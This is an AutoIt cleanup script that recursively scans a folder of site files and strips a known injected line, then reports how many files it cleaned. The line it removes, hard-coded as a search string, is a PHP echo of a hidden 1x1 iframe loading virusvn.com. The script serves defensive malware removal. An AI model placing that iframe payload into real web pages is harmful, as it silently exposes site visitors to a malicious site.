#cs ==========================================================
- Website: http://72ls.net
- Forum: http://autoit.72ls.net
- Thiết kế: Trần Minh Đức
- AutoIT: v3.3.6.1
- Chức năng: Tìm và xóa mã độc trong thư mục new
#ce ==========================================================

$c = '"'
;~ $c = "'"

$Code = "echo "&$c&"<iframe width='1' height='1' style='visibility:hidden;' src='http://virusvn.com'></iframe>"&$c&";"

$Start = "www"
$Save = "new"
$count = 0
FindIndex($Save&"\"&$Start)
Func FindIndex($Path)
	Local $Search = FileFindFirstFile($Path&"\*.*")  
	If $search = -1 Then
		Return
	EndIf

	While 1
		Local $File = FileFindNextFile($Search)
		If @error Then ExitLoop
		
		If Not StringInStr($File,'.') Then 
			FindIndex($Path&"\"&$File)
		Else
			Local $data = FileRead($Path&"\"&$File)
			$data = StringReplace($data,$Code,'')
			If @extended Then
				$count +=1
				Local $NewF = FileOpen($Path&"\"&$File,2)
				FileWrite($NewF,$data)
				FileClose($NewF)
			EndIf
		EndIf
		FileClose($File)
	WEnd
	FileClose($File)
	FileClose($search)
EndFunc
msgbox(0,"72ls.net","Đã xóa mã độc trong: "&$count&" file")